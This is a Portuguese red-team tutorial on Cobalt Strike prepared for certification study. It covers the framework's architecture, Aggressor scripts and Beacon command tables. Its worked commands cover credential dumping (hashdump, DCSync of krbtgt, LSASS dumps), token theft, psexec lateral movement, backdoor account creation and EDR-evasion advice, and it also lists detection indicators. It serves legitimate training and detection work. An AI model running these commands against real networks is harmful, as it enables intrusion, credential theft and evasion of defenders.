---
layout: cyber
section: c2
title: "Cobalt Strike Fundamentos"
---

# Cobalt Strike Fundamentos

## A Ferramenta Padrão de Red Team Profissional

Cobalt Strike é o framework de Command & Control (C2) mais amplamente utilizado em operações de red team profissionais e, infelizmente, também por grupos APT (Advanced Persistent Threat) e operadores de ransomware. Compreender profundamente sua arquitetura, capacidades e operação é indispensável para qualquer aspirante a operador de red team preparando-se para as certificações CRTO I, CRTO II e OSEP.

O domínio do Cobalt Strike oferece vantagens em múltiplas dimensões:

- **Perspectiva ofensiva**: Executar campanhas de ataque realistas que simulam TTPs (Tactics, Techniques, and Procedures) de adversários sofisticados.
- **Perspectiva defensiva**: Entender como o Beacon opera permite que defensores desenvolvam detecções eficazes e respondam a incidentes envolvendo o framework.
- **Correlação com ATT&CK**: Cobalt Strike mapeia diretamente dezenas de técnicas MITRE ATT&CK, tornando-o essencial para engajamentos purple team.
- **Ubiquidade em engajamentos reais**: A maioria dos relatórios de red team de alto perfil menciona Cobalt Strike ou ferramentas que o imitam.

As certificações CRTO (de Rasta Mouse) são construídas explicitamente em torno do Cobalt Strike, enquanto o OSEP (OffSec Experienced Penetration Tester) exige familiaridade com frameworks C2 avançados para técnicas como process injection, AV evasion e lateral movement.

---

## Arquitetura: Team Server, Client, Beacon

### Arquitetura Geral

O Cobalt Strike opera em um modelo cliente-servidor com três componentes principais:

```
+------------------+          HTTPS/443          +-------------------+
|   CS Client      |  <------------------------> |   Team Server     |
|  (Operador)      |                             |  (Linux VPS)      |
+------------------+                             +-------------------+
                                                         |
                                                    (C2 channel)
                                                         |
                                               +---------v----------+
                                               |   Beacon Agent     |
                                               |  (Alvo comprometido)|
                                               +--------------------+
```

**Team Server (Servidor)**
- Processo Java executado em Linux (geralmente VPS)
- Gerencia todos os Beacons ativos, listeners e artefatos
- Armazena logs, capturas de dados e credenciais coletadas
- Aceita conexões de múltiplos CS Clients simultaneamente
- Iniciado via: `./teamserver <IP> <senha> [perfil malleable]`

**CS Client (Cliente)**
- Interface gráfica Java executada na máquina do operador
- Conecta ao Team Server via senha compartilhada
- Permite múltiplos operadores na mesma sessão (Distributed Operations)
- Fornece console de interação com Beacons, geração de payloads e listeners

**Beacon Agent**
- O implante que executa no sistema comprometido
- Comunica-se com o Team Server (ou com redirectors na frente dele)
- Implementa o protocolo Malleable C2 para disfarçar o tráfego
- Executa tarefas de forma assíncrona (modelo pull-based)

### O Modelo Pull-Based do Beacon

O Beacon NÃO mantém conexão persistente. Ele opera em ciclos de check-in:

```
CICLO DE OPERAÇÃO DO BEACON:

1. [Beacon dorme por X segundos (sleep + jitter)]
2. [Beacon acorda e conecta ao C2]
3. [Faz GET request para /path/configurado]
4. [Team Server responde com lista de tarefas]
5. [Beacon executa as tarefas localmente]
6. [Beacon faz POST com resultados das tarefas]
7. [Volta ao passo 1]
```

Esse modelo tem implicações críticas:
- Comandos não são executados instantaneamente - ficam em fila até o próximo check-in
- Um `sleep 60` significa esperar 60 segundos pelo resultado
- Reduz detecção por não manter conexões TCP longas abertas

### Processo de Staging

O Cobalt Strike suporta dois modelos de deployment:

**Staged (Stager + Stage)**
```
Alvo executa stager (pequeno, ~100bytes shellcode)
        |
        v
Stager faz HTTP GET para /[uri]
        |
        v
Team Server responde com Beacon completo (stage)
        |
        v
Stager injeta stage na memória e executa
```

**Stageless**
```
Alvo executa payload completo (Beacon embutido)
Sem comunicação adicional para staging
Direto para check-in com C2
```

### Tipos de Beacon

| Tipo | Protocolo | Características | Caso de Uso |
|------|-----------|-----------------|-------------|
| HTTP | HTTP porta 80 | Tráfego em plain text, customizável | Ambientes sem inspeção SSL |
| HTTPS | HTTPS porta 443 | Criptografado, certificado customizável | Padrão para maioria dos engajamentos |
| DNS | DNS A/TXT/AAAA | Muito lento, mas passa por quase todos os firewalls | Canal de backup quando HTTP bloqueado |
| SMB | Named Pipe | Sem tráfego de rede externo, P2P entre Beacons | Lateral movement em redes segmentadas |
| TCP | TCP bind/reverse | Rápido, encaminhado via pivot | Pivoting interno em hosts sem acesso direto |

### Aggressor Scripts

Aggressor Scripts é a linguagem de extensão do Cobalt Strike, baseada em **Sleep** (linguagem de scripting baseada em Perl/Java). Permite:

- Customizar a interface do CS Client
- Criar novos comandos e aliases
- Automatizar tarefas repetitivas
- Integrar ferramentas externas
- Modificar comportamentos padrão do Beacon

Estrutura básica de um Aggressor Script:

```perl
# Carregar script: no CS Client > Script Console > load /path/myscript.cna

# Definir novo comando para o Beacon
beacon_command_register(
    "meucomando",
    "Descrição curta do comando",
    "Uso: meucomando [argumento]"
);

# Implementar o comportamento
alias meucomando {
    # $1 = bid (Beacon ID), $2+ = argumentos
    local('$bid $arg');
    $bid = $1;
    $arg = $2;
    
    # Enviar comando shell para o Beacon
    bshell($bid, "whoami");
    
    # Exibir mensagem no console
    blog($bid, "Executando meu comando personalizado");
}

# Evento disparado quando Beacon faz check-in
on beacon_initial {
    # $1 = objeto do Beacon
    blog($1, "Novo Beacon registrado!");
    # Executar setup automático
    bgetuid($1);
    bpwd($1);
}

# Popup menu customizado ao clicar com botão direito em Beacon
popup beacon_bottom {
    item "Minha Acao" {
        local('$bid');
        $bid = $1;
        bshell($bid, "net user");
    }
}
```

---

## Na Prática

### Iniciando o Team Server

```bash
# No servidor Linux (VPS)
# Instalar Java
apt-get install -y default-jdk

# Executar Team Server sem perfil Malleable C2
./teamserver 10.10.10.1 SenhaForte123

# Executar com perfil Malleable C2
./teamserver 10.10.10.1 SenhaForte123 /opt/profiles/amazon.profile

# Verificar se está rodando
ps aux | grep teamserver
netstat -tlnp | grep 50050  # porta padrão do CS
```

### Conectando o CS Client

```bash
# No cliente (Kali/Windows do operador)
java -jar cobaltstrike.jar

# Preencher:
# Host: IP do Team Server
# Port: 50050
# User: nome do operador
# Password: senha configurada no Team Server
```

### Fluxo Operacional Básico

```
1. Criar Listener (Cobalt Strike > Listeners > Add)
   - Name: http-principal
   - Payload: windows/beacon_http/reverse_http
   - Host: IP/domínio do redirector
   - Port: 80
   
2. Gerar Payload (Attacks > Packages)
   - Windows Executable (Stageless) para .exe
   - HTML Application para .hta
   - Raw para shellcode
   
3. Entregar payload ao alvo (phishing, exploit, etc.)

4. Aguardar Beacon fazer check-in no CS Client

5. Interagir com o Beacon (botão direito > Interact)

6. Executar comandos no console do Beacon
```

### Distributed Operations

Em engajamentos grandes, múltiplos Team Servers são usados:

```
[Team Server A]     [Team Server B]     [Team Server C]
Phishing/Inicial    Pós-exploração      Exfiltração
     |                    |                   |
     +--------------------+-------------------+
                          |
                  [CS Client Opera A+B+C]
```

Cada Team Server tem seu próprio conjunto de listeners e beacons. O CS Client pode conectar a múltiplos Team Servers simultaneamente.

**External C2**: Permite que implantes de terceiros (não Beacon nativos) se comuniquem com o Team Server via pipe SMB, possibilitando integração com outras plataformas.

---

## Exemplos de Código / Comandos

### Tabela Completa de Comandos por Categoria

#### Reconhecimento e Enumeracao

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `ls` | Listar diretório atual | `ls C:\Users` |
| `ps` | Listar processos | `ps` |
| `pwd` | Diretório atual | `pwd` |
| `getuid` | Usuário atual | `getuid` |
| `getpid` | PID do processo Beacon | `getpid` |
| `ipconfig` | Configuração de rede | `ipconfig` |
| `net view` | Hosts na rede | `net view` |
| `net localgroup administrators` | Membros do grupo admins | `shell net localgroup administrators` |
| `net domain` | Informações de domínio | `shell net user /domain` |

#### Execucao de Codigo

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `shell` | Executa via cmd.exe | `shell whoami /all` |
| `run` | Executa sem shell (mais stealth) | `run whoami /all` |
| `execute` | Executa processo sem output | `execute C:\malware.exe` |
| `powershell` | Executa via PowerShell | `powershell Get-Process` |
| `powerpick` | PowerShell sem powershell.exe (via runspace) | `powerpick Get-Process` |
| `execute-assembly` | Executa .NET assembly em memória | `execute-assembly /tools/Rubeus.exe kerberoast` |
| `psinject` | Injeta PowerShell em processo específico | `psinject 1234 x64 Get-Process` |
| `shinject` | Injeta shellcode em processo | `shinject 1234 x64 /path/shellcode.bin` |

#### Gerenciamento de Arquivos

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `upload` | Envia arquivo para o alvo | `upload /local/mimikatz.exe` |
| `download` | Baixa arquivo do alvo | `download C:\Users\user\Desktop\arquivo.docx` |
| `cp` | Copia arquivo no alvo | `cp C:\arquivo.txt C:\temp\copia.txt` |
| `mv` | Move arquivo no alvo | `mv C:\temp\arquivo.txt C:\Windows\Temp\` |
| `rm` | Remove arquivo | `rm C:\temp\arquivo.txt` |
| `mkdir` | Cria diretório | `mkdir C:\temp\pasta` |

#### Gerenciamento de Sessao e Processos

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `sleep` | Altera intervalo de check-in | `sleep 60 20` (60s + 20% jitter) |
| `jobs` | Lista tarefas em background | `jobs` |
| `jobkill` | Cancela tarefa em background | `jobkill 1` |
| `kill` | Encerra processo | `kill 1234` |
| `exit` | Encerra o Beacon | `exit` |

#### Escalacao de Privilegios e Tokens

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `getsystem` | Tenta elevar para SYSTEM | `getsystem` |
| `getprivs` | Lista privilégios do token | `getprivs` |
| `make_token` | Cria token com credenciais | `make_token DOMAIN\user Senha123` |
| `steal_token` | Rouba token de processo | `steal_token 1234` |
| `rev2self` | Reverte para token original | `rev2self` |
| `runas` | Executa comando como outro usuário | `runas DOMAIN\user Senha123 cmd.exe` |
| `elevate` | Menu de exploits de elevação | `elevate uac-token-duplication listener` |

#### Dump de Credenciais

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `hashdump` | Dump de hashes SAM (requer SYSTEM) | `hashdump` |
| `logonpasswords` | Mimikatz logonpasswords | `logonpasswords` |
| `dcsync` | DCSync para replicar credenciais do AD | `dcsync DOMAIN\krbtgt` |
| `chromedump` | Extrai credenciais do Chrome | `chromedump` |

#### Movimento Lateral

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `jump` | Movimento lateral (vários métodos) | `jump psexec HOST listener` |
| `remote-exec` | Executa remotamente sem Beacon | `remote-exec psexec HOST cmd.exe /c whoami` |
| `spawnas` | Spawn Beacon como outro usuário | `spawnas DOMAIN\admin Senha listener` |
| `inject` | Injeta Beacon em processo | `inject 1234 x64 listener` |

#### Redes e Pivoting

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `socks` | Abre proxy SOCKS4 | `socks 1080` |
| `socks stop` | Para o proxy SOCKS | `socks stop` |
| `rportfwd` | Port forward reverso | `rportfwd 4444 10.10.10.1 4444` |
| `covertvpn` | VPN layer 3 via Beacon | `covertvpn adapter ip` |

### Exemplos Detalhados de Comandos

```bash
# === RECONHECIMENTO INICIAL ===

# Obter contexto básico do Beacon
getuid        # DOMAIN\usuario
getpid        # PID: 4832
pwd           # C:\Windows\System32

# Enumerar processos (identificar AV, EDR)
ps
# Procurar: MsMpEng.exe (Defender), csrss.exe, lsass.exe, etc.

# Listar arquivos
ls C:\Users\Administrator\Desktop

# === EXECUÇÃO STEALTH ===

# Usar run ao invés de shell (evita cmd.exe como processo filho)
run net user /domain

# PowerShell sem criar processo powershell.exe
powerpick Invoke-WebRequest -Uri http://10.10.10.1/test

# Executar .NET assembly em memória (sem tocar disco)
execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt
execute-assembly /opt/tools/SharpHound.exe --CollectionMethod All
execute-assembly /opt/tools/Certify.exe find /vulnerable

# === ESCALAÇÃO DE PRIVILÉGIOS ===

# Verificar privilégios atuais
getprivs

# Tentar getsystem (múltiplos métodos)
getsystem

# Se em contexto de usuário com SeImpersonatePrivilege
# (comum em contas de serviço IIS/SQL)
execute-assembly /opt/tools/PrintSpoofer.exe -i -c cmd

# === MANIPULAÇÃO DE TOKENS ===

# Criar token com credenciais (Pass-the-Password)
make_token DOMINIO\administrador SenhaCorreta123

# Roubar token de processo privilegiado
steal_token 688   # PID do processo SYSTEM

# Verificar novo contexto
getuid

# Reverter token
rev2self

# === DUMP DE CREDENCIAIS ===

# Elevado para SYSTEM - dumpar SAM
hashdump

# Mimikatz direto (mais barulhento)
logonpasswords

# DCSync - replicar hash de qualquer conta do domínio
# Requer permissões de DC replication (admin de domínio ou similar)
dcsync DOMINIO\Administrator
dcsync DOMINIO\krbtgt  # Para criar Golden Ticket

# === MOVIMENTO LATERAL ===

# Jump via PSExec (cria serviço, barulhento mas funciona)
jump psexec SERVER01 http-listener

# Jump via WinRM (mais stealth)
jump winrm64 SERVER01 http-listener

# Jump via PSExec com serviço customizado
jump psexec_psh SERVER01 http-listener

# Remote exec sem deixar Beacon (apenas execução)
remote-exec psexec SERVER01 cmd.exe /c "net user hacker P@ssw0rd /add"

# Spawn como usuário diferente
spawnas DOMINIO\outro_admin SenhaOutro http-listener

# Injetar em processo existente
inject 4832 x64 http-listener

# === PIVOTING ===

# Abrir SOCKS proxy local na porta 1080
socks 1080
# Configurar proxychains: socks4 127.0.0.1 1080
# proxychains nmap -sT 192.168.1.0/24

# Port forward reverso
rportfwd 8080 10.10.10.1 80

# === OPERAÇÕES COM ARQUIVOS ===

# Upload de ferramenta
upload /opt/tools/mimikatz.exe
# Arquivo aparece no diretório atual do Beacon

# Download de arquivo interessante
download C:\Users\Administrator\Desktop\passwords.xlsx
# Arquivo salvo em downloads/ no Team Server

# === CONTROLE DO BEACON ===

# Reduzir footprint - dormir mais
sleep 300 30   # 5 minutos com 30% jitter

# Verificar tarefas em background
jobs

# Encerrar tarefa específica
jobkill 1

# Sair limpamente
exit
```

---

## Detecção e OPSEC

### Indicadores de Comprometimento (IoCs) do Cobalt Strike

**IoCs de Rede (sem Malleable C2 customizado):**
- User-Agent padrão: `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 123456789)` - o número aleatório ao final é característico
- URI patterns padrão: `/submit.php`, `/load`, `/pixel.gif`
- Tamanho de resposta consistente do stage (≈208KB sem compressão)
- Certificado SSL auto-assinado com campos específicos ("Cobalt Strike" em campos padrão)
- Beacon interval preciso e regular (sem jitter → fácil detecção por análise de frequência)

**IoCs de Memória/Processo:**
- Beacon injetado em processos como `rundll32.exe`, `svchost.exe`, `explorer.exe`
- Strings características em memória mesmo após XOR encoding
- `pe.header` em alocações de memória RWX
- Sleep masking ausente deixa strings em claro

**Detecções de Comportamento:**
- `cmd.exe` como filho de processo incomum (IIS, Word, etc.)
- `powershell.exe -EncodedCommand` frequente
- Acesso ao LSASS memory (`lsass.exe` com OpenProcess)
- Criação de serviços temporários (psexec)
- Replicação de credenciais DC (DCSync via DRSReplicaSyncV2)

### OPSEC no Uso do Cobalt Strike

```bash
# BOAS PRÁTICAS DE OPSEC

# 1. Sempre usar Malleable C2 Profile personalizado
./teamserver IP SENHA /opt/profiles/amazon-aws.profile

# 2. Configurar sleep longo em Beacons de longa duração
sleep 3600 25  # 1 hora, 25% jitter

# 3. Nunca usar hashdump/logonpasswords diretamente
#    Preferir execute-assembly com ferramentas mais stealth
execute-assembly /tools/Nanodump.exe --write C:\Windows\Temp\tmp.dmp

# 4. Usar powerpick ao invés de powershell
#    (evita criar powershell.exe)
powerpick <comando>

# 5. Injetar em processos "legítimos" para operações longas
inject <PID_do_explorer> x64 long-haul-listener

# 6. Usar SMB Beacon para movimento lateral interno
#    (sem tráfego de rede externo para o C2)
jump psexec_psh SERVER01 smb-listener

# 7. Limpar artefatos após operação
rm C:\Windows\Temp\ferramenta.exe

# 8. Evitar comandos que spawnam processos filhos óbvios
#    Ruim: shell whoami
#    Melhor: run whoami
#    Melhor ainda: execute-assembly com .NET

# 9. Não reutilizar listeners/infraestrutura entre engajamentos

# 10. Verificar processos de AV/EDR antes de executar ações sensíveis
ps | grep -i "defender\|cylance\|crowdstrike\|carbon"
```

### Cobalt Strike vs Alternativas

| Framework | Licença | Linguagem | Pontos Fortes | Limitações |
|-----------|---------|-----------|---------------|------------|
| **Cobalt Strike** | Comercial ($7,500+/ano) | Java (Server), C (Beacon) | Maduro, extensível, ampla documentação, usado em campo | Caro, muito detectado sem customização |
| **Havoc** | Open Source | Go (Server), C/ASM (Demon) | Gratuito, moderno, evasão melhorada, Demon agent | Menos maduro, comunidade menor |
| **Sliver** | Open Source | Go | Multiplataforma, implante Go difícil de detectar, mTLS | Interface menos polida |
| **Metasploit** | Open/Pro | Ruby | Exploits amplos, muito documentado | Meterpreter muito detectado |
| **Brute Ratel C4** | Comercial | C (implante) | Focado em evasão de EDR, BOF support | Menos documentação pública |
| **NightHawk** | Comercial | C/C++ | Alta evasão, profissional | Preço alto, menos acessível |

---

## Módulos Relacionados

`02_listeners_e_payloads.md` cobre geração de payloads, staged vs stageless, tipos de listener. `03_malleable_c2_profiles.md` desce em customização de IoCs de rede e comportamento em memória. `04_infraestrutura_resiliente_redirectors.md` fecha com redirectors, domain fronting, separação de servidores. MITRE ATT&CK relevantes: T1059.001 (PowerShell), T1055 (Process Injection), T1003.001 (LSASS Memory), T1003.006 (DCSync), T1021.002 (SMB Admin Shares), T1078 (Valid Accounts), T1572 (Protocol Tunneling).

---

## Leitura Complementar

- Documentação oficial — https://hstechdocs.helpsystems.com/manuals/cobaltstrike/
- Aggressor Script Reference — https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor-script_aggressor-script.htm
- Ferramentas complementares: Rubeus (Kerberos), SharpHound (BloodHound), Certify (AD CS), Nanodump (LSASS stealth)
